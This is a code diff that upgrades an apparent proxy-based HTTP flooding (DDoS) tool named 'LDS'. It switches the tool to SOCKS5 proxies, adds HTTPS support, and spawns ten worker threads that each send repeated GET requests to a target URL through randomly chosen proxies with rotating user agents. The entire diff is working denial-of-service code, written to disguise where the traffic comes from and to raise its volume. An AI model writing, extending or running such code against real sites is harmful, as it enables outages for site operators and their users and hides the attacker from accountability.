@@ -1,10 +1,11 @@
 const http = require('http');
+const https = require('https');
 const fs = require('fs');
 const { SocksClient } = require('socks');
+const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
 const layer7 = require('./methods/layer7');
 
-const socks4Proxies = fs.readFileSync('socks4.txt', 'utf8').split('\n').filter(Boolean);
-
+const socks5Proxies = fs.readFileSync('socks5.txt', 'utf8').split('\n').filter(Boolean);
 const userAgents = fs.readFileSync('uas.txt', 'utf8').split('\n').filter(Boolean);
 
 async function sendPacket(targetUrl, proxy, delay, kbSize, method) {
@@ -16,14 +17,14 @@ async function sendPacket(targetUrl, proxy, delay, kbSize, method) {
             proxy: {
                 ipaddress: proxyIp,
                 port: parseInt(proxyPort),
-                type: 4, 
+                type: 5, 
             },
             destination: {
                 host: target.hostname,
-                port: target.port || 80,
+                port: target.port || (target.protocol === 'https:' ? 443 : 80),
             },
             command: 'connect',
-            timeout: 5000, 
+            timeout: 5000,
         };
 
         SocksClient.createConnection(options, (err, info) => {
@@ -35,15 +36,19 @@ async function sendPacket(targetUrl, proxy, delay, kbSize, method) {
 
             if (layer7[method]) {
                 const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
-                const req = http.request({
+                const protocol = target.protocol === 'https:' ? https : http;
+
+                const req = protocol.request({
                     host: target.hostname,
-                    port: target.port || 80,
+                    port: target.port || (target.protocol === 'https:' ? 443 : 80),
                     path: target.pathname,
-                    method: 'GET', 
+                    method: 'GET',
                     headers: {
-                        'User-Agent': userAgent, 
+                        'User-Agent': userAgent,
+                        'Accept': '*/*',
+                        'Connection': 'keep-alive',
                     },
-                    socket: info.socket, 
+                    socket: info.socket,
                 }, (res) => {
                     console.log(`LDS: Packet sent to ${targetUrl} via ${proxy} with method ${method}`);
                     resolve();
@@ -67,18 +72,37 @@ async function sendPacket(targetUrl, proxy, delay, kbSize, method) {
     });
 }
 
-function start(targetUrl, delay, kbSize, method) {
-    setInterval(() => {
-        const proxy = socks4Proxies[Math.floor(Math.random() * socks4Proxies.length)];
-
-        sendPacket(targetUrl, proxy, delay, kbSize, method).catch((err) => {
-            if (err.code === 'ECONNRESET' || err.code === 'ECONNREFUSED') {
-                console.error(`LDS: Connection error with ${proxy}`);
-            } else {
-                console.error(`LDS: Error with ${proxy}`);
-            }
+function startWorker(targetUrl, delay, kbSize, method) {
+    return new Promise((resolve, reject) => {
+        const worker = new Worker(__filename, {
+            workerData: { targetUrl, delay, kbSize, method },
         });
-    }, delay); 
+
+        worker.on('message', resolve);
+        worker.on('error', reject);
+        worker.on('exit', (code) => {
+            if (code !== 0) reject(new Error(`Worker stopped with exit code ${code}`));
+        });
+    });
+}
+
+if (!isMainThread) {
+    const { targetUrl, delay, kbSize, method } = workerData;
+    setInterval(() => {
+        const proxy = socks5Proxies[Math.floor(Math.random() * socks5Proxies.length)];
+        sendPacket(targetUrl, proxy, delay, kbSize, method).catch((err) => {
+            console.error(`LDS: Error with ${proxy}`);
+        });
+    }, delay);
+}
+
+function start(targetUrl, delay, kbSize, method) {
+    const numWorkers = 10; 
+    for (let i = 0; i < numWorkers; i++) {
+        startWorker(targetUrl, delay, kbSize, method).catch((err) => {
+            console.error(`LDS: Worker error: ${err.message}`);
+        });
+    }
 }
 
 module.exports = { start };
